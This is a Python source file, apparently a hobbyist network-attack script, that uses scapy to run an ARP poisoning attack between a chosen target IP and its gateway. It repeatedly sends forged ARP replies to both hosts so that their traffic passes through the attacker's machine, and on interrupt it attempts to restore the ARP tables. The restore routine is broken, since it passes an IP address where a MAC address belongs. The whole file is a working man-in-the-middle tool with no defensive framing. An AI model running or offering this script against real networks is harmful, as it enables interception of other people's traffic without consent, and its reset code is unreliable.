import scapy.all as scapy
import time
import optparse


def get_user_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-t", "--target", dest="target_ip", help="Enter target IP address")
    parse_obj.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP address")
    user_input = parse_obj.parse_args()[0]

    if not user_input.target_ip:
        print("Error!Enter target IP address")

    if not user_input.gateway_ip:
        print("Error!Enter gateway IP address")

    return user_input


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packets = broadcast_packet / arp_request
    answered = scapy.srp(combined_packets, timeout=1)[0]
    return answered[0][1].hwsrc


def arp_poisoning(ip1, ip2):
    target_mac = get_mac_address(ip1)
    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2)
    scapy.send(arp_response)


def reset_operation(ip1,ip2):
    mac1 = get_mac_address(ip1)
    mac2 = get_mac_address(ip2)

    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc= ip2)
    scapy.send(arp_response, count=6)


user_target_ip = get_user_input().target_ip
user_gateway_ip = get_user_input().gateway_ip


try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        time.sleep(3)
except KeyboardInterrupt:
    print("Script stopped working.")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
